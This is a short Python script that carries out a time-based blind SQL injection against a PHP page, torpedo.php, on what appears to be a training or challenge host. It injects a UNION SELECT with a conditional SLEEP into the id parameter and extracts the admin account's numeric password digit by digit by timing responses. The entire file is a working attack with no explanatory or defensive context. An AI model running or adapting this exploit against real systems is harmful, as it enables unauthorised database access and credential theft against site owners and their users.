import requests as requests
import time

password = ""
iterator = 0

try:
    for i in range(8):
        iterator = 0
        for id_number in range(0, 10):
            url = "https://xviest.bit.demo-cert.sk/torpedo.php?id=1 and 1=2 " \
                "union select if(password like \"{}{}%\" and login like 'admin', sleep(5), false) " \
                  "from users where login like \"admin\" --".format(password, id_number)
            start = time.time()
            response = requests.get(url)
            end = time.time()
            if end - start > 2:
                iterator = 1
                password += str(id_number)
                print("Found: {}".format(id_number))
                break
        if iterator == 0:
            print("Password found: {}".format(password))
            break
except requests.exceptions.RequestException as e:
    print("An error occurred:", e)
